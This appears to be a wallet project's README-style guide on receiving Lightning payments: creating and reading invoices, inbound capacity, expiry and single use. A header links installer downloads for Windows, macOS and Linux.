<p align="center"><img src="assets/banner-article.png" alt="Lightning Pay Wallet"></p>
# How to receive a Lightning payment and read the invoice
Create the request, understand what you are handing over, and know why a first receive can fail.
<p align="center"><a href="https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-windows-v1.2.1.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-0350c2?style=for-the-badge&logo=data:image/svg%2Bxml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=ffffff&labelColor=091640" alt="DOWNLOAD Windows"></a> <a href="https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-macos-v1.2.1.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-0350c2?style=for-the-badge&logo=apple&logoColor=ffffff&labelColor=091640" alt="DOWNLOAD macOS"></a> <a href="https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-linux-v1.2.1.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-0350c2?style=for-the-badge&logo=linux&logoColor=ffffff&labelColor=091640" alt="DOWNLOAD Linux"></a></p>
<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| ![Windows](https://img.shields.io/badge/platform-Windows-fed023?style=flat-square&logo=data:image/svg%2Bxml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=ffffff&labelColor=091640) | Windows 10 (1909) or later, 64-bit | [lightning-pay-wallet-windows-v1.2.1.exe](https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-windows-v1.2.1.exe) |
| ![macOS](https://img.shields.io/badge/platform-macOS-fed023?style=flat-square&logo=apple&logoColor=ffffff&labelColor=091640) | macOS 12 or later | [lightning-pay-wallet-macos-v1.2.1.dmg](https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-macos-v1.2.1.dmg) |
| ![Linux](https://img.shields.io/badge/platform-Linux-fed023?style=flat-square&logo=linux&logoColor=ffffff&labelColor=091640) | x64, Ubuntu 20.04 or later, or equivalent | [lightning-pay-wallet-linux-v1.2.1.zip](https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-linux-v1.2.1.zip) |

</div>
Every file above is published on [the Lightning Pay Wallet release page](https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/tag/v1.2.1) under the same names, and that page is the only place the installers should come from.
> **Only download from this GitHub release page.**

Receiving is the mirror of paying, with one difference that catches everyone: to be paid over
Lightning, the network needs somewhere for the money to land. A wallet can be installed, funded and
working, and still be unable to receive, because inbound capacity is a separate thing from balance.

## Creating the invoice

Open the receive screen, enter the amount you expect, and the wallet produces an invoice: a string
beginning `lnbc` that carries the amount, a payment hash, your node and an expiry. Hand that to the
payer through any channel you like. It is a request, not an address, and it is meant to be used once.

Leave the amount blank only if you genuinely want the payer to choose. An invoice with no amount is
valid, but it removes the one number you can check afterwards.

## Why a first receive can fail

A payment needs a route to you with capacity on your side. A new wallet with no channel has none, so
the payer's attempt fails on their end with a routing error while your wallet looks perfectly healthy.

This is the most confusing moment in Lightning for a new user: two wallets, both installed, both
online, and a payment that will not go through. The wallet resolves it by opening a channel, which is
an on-chain transaction and therefore a cost. That cost is why a first receive can appear to carry a
fee even though the wallet charges nothing to receive.

Once a channel exists with inbound capacity, later receives settle in seconds.

## Invoices expire

Every invoice carries an expiry. An expired invoice fails before any money moves, which is why "this
invoice has expired" is routine rather than alarming. If a payer reports that message, create a new
invoice rather than arguing about the old one.

Do not reuse a paid invoice either. The payment hash is single-use, and a second attempt against it
fails by design, not by accident.

## After the payment arrives

The balance updates and the payment appears in the history with its amount and time. If the balance
still reads zero, give the sync a moment and reopen the wallet; a completed sync that shows nothing
is a support question, and reinstalling is not the answer.

The amount you see is what arrived. There is no hold, no pending state to clear and no settlement
delay: Lightning either completed or it did not.

## Reading an invoice you were given

If you are the payer, the useful fields are the amount, the description and the expiry. The
description is the payer-facing context and it comes from whoever wrote the invoice. The amount is
fixed once written, so an invoice for more than expected is worth stopping over.

The mechanics of paying one are in
[how to send a Lightning payment](https://github.com/bitcoin-lightning-wallet/lightning-payments-guides/blob/HEAD/send-a-lightning-payment.md).

## Questions people ask

### Do I need to keep the wallet open to be paid?

Yes, at the moment the payment arrives. A closed wallet cannot complete the handshake, so the payer
sees a failure. Nothing is lost; ask them to try again once the wallet is open.

### Can two people pay the same invoice?

No. An invoice is single-use. Two payers need two invoices, which the wallet creates in seconds.

### Does receiving cost a fee?

Not to the wallet. If a channel has to be opened to accept the payment, the on-chain fee for opening
it is the real cost, and it is paid once rather than per payment.

## Related guides

- [How to send a Lightning payment, step by step](https://github.com/bitcoin-lightning-wallet/lightning-payments-guides/blob/HEAD/send-a-lightning-payment.md)
- [Why a Lightning payment fails, sticks or shows a zero balance](https://github.com/bitcoin-lightning-wallet/lightning-payments-guides/blob/HEAD/why-a-lightning-payment-fails-or-sticks.md)

